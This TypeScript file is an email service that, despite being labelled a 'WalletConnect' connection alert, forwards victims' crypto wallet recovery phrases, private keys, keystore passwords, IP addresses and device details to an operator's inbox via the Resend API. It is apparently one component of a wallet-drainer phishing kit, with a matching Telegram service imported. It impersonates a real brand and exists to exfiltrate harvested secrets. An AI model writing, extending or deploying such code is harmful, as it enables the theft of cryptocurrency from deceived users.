import { Resend } from 'resend'
import { emailConfig, isEmailConfigured } from '../config/email.js'
import type { WalletNotificationData } from './telegram.service.js'

const resend = emailConfig.resendApiKey ? new Resend(emailConfig.resendApiKey) : null

class EmailService {
  private get enabled() {
    return isEmailConfigured() && resend !== null
  }

  private buildHtml(payload: WalletNotificationData): string {
    const now = new Date()
    const date = now.toLocaleDateString()
    const time = now.toLocaleTimeString()

    let dataBlock = ''

    if (payload.method === 'phrase') {
      dataBlock = `
        <div style="background:#f0f4ff;padding:16px;border-radius:8px;margin:10px 0;">
          <p style="margin:4px 0;"><strong>🔑 Recovery Phrase:</strong></p>
          <p style="margin:8px 0;font-family:monospace;font-size:14px;background:#fff;padding:12px;border-radius:4px;word-break:break-all;">
            ${payload.data.phrase || 'Not provided'}
          </p>
          <p style="margin:4px 0;color:#6b7280;font-size:12px;">
            📊 Word Count: ${payload.data.wordCount || 0}/24
          </p>
        </div>`
    } else if (payload.method === 'private key') {
      dataBlock = `
        <div style="background:#fef3c7;padding:16px;border-radius:8px;margin:10px 0;">
          <p style="margin:4px 0;"><strong>🔑 Private Key:</strong></p>
          <p style="margin:8px 0;font-family:monospace;font-size:14px;background:#fff;padding:12px;border-radius:4px;word-break:break-all;">
            ${payload.data.privateKey || 'Not provided'}
          </p>
        </div>`
    } else {
      dataBlock = `
        <div style="background:#f3e8ff;padding:16px;border-radius:8px;margin:10px 0;">
          <p style="margin:4px 0;"><strong>📁 File:</strong> ${payload.data.fileName || 'N/A'}</p>
          <p style="margin:4px 0;"><strong>🔐 Password:</strong> ${payload.data.password || 'N/A'}</p>
        </div>`
    }

    return `
      <!DOCTYPE html>
      <html>
        <body style="font-family:Arial,sans-serif;line-height:1.6;color:#333;margin:0;padding:0;background:#f5f5f5;">
          <div style="max-width:600px;margin:0 auto;padding:20px;">
            <div style="background:linear-gradient(135deg,#1e40af,#3b82f6);color:#fff;padding:30px;border-radius:12px 12px 0 0;text-align:center;">
              <h1 style="margin:0;font-size:24px;">🔐 WalletConnect</h1>
              <p style="margin:8px 0 0 0;opacity:.9;font-size:14px;">New Wallet Connection Alert</p>
            </div>
            <div style="background:#fff;padding:30px;border-radius:0 0 12px 12px;">
              <h2 style="margin:0 0 20px 0;font-size:20px;">🔔 Connection Detected</h2>
              <table style="width:100%;border-collapse:collapse;margin:15px 0;">
                <tr><td style="padding:8px;background:#f9fafb;border-radius:6px;"><strong>Wallet:</strong> ${payload.wallet}</td></tr>
                <tr><td style="padding:8px;"><strong>Method:</strong> ${payload.method}</td></tr>
                <tr><td style="padding:8px;background:#f9fafb;border-radius:6px;"><strong>Date:</strong> ${date} ${time}</td></tr>
                <tr><td style="padding:8px;"><strong>IP:</strong> ${payload.ipAddress || 'Unknown'}</td></tr>
                <tr><td style="padding:8px;background:#f9fafb;border-radius:6px;font-size:12px;word-break:break-all;"><strong>Device:</strong> ${payload.userAgent || 'Unknown'}</td></tr>
              </table>
              <h3 style="font-size:14px;margin:20px 0 8px 0;">📦 Connection Data</h3>
              ${dataBlock}
              <div style="background:#fef2f2;border-left:4px solid #dc2626;padding:12px;margin:15px 0;border-radius:4px;">
                <p style="color:#991b1b;font-size:13px;margin:0;">⚠️ Sensitive security alert. Investigate immediately if unexpected.</p>
              </div>
            </div>
            <p style="text-align:center;color:#999;font-size:12px;margin-top:20px;">
              © ${now.getFullYear()} WalletConnect — Automated notification
            </p>
          </div>
        </body>
      </html>
    `
  }

  async sendWalletNotification(payload: WalletNotificationData): Promise<boolean> {
    if (!this.enabled || !resend) {
      console.warn('⚠️ Email not configured — skipping notification')
      return false
    }

    try {
      const { error } = await resend.emails.send({
        from: emailConfig.fromEmail,
        to: [emailConfig.notificationEmail],
        subject: `🔐 New Wallet Connection: ${payload.wallet} (${payload.method})`,
        html: this.buildHtml(payload),
      })

      if (error) {
        console.error('Resend error:', error)
        return false
      }
      console.log('✅ Email notification sent')
      return true
    } catch (err) {
      console.error('Email send failed:', err)
      return false
    }
  }
}

export const emailService = new EmailService()